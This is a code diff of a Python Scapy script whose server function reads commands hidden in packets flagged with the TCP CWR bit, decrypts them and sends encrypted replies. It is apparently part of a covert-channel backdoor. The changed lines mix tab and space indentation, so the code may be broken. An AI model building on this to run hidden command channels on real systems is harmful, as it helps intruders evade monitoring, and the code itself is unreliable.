@@ -122,7 +122,7 @@ def server(pkt):
     #Checks for the flag if it is "C"
     #Note that the "C" flag in long is 128
     if flagSet == long(128):
-        if dport == destPort:
+        if dport == int(destPort):
         	#Grab the source IP for each packets
             src_ip = pkt[IP].src
             #Instantiate variables
@@ -138,7 +138,8 @@ def server(pkt):
                 newData = decryptedData[20:]
                 #If we get exit command, send exit command back to client
                 if newData == "exit":
-                    encryptExit = encryptCommand(authPacket + newData)
+                	exitData = newData
+                    encryptExit = encryptCommand(authPacket + exitData)
                     pkt = IP(dst=str(src_ip))/TCP(dport=int(clientPort), flags='C')/Raw(load=encryptExit)
                     #Send the packet
                     send(pkt)
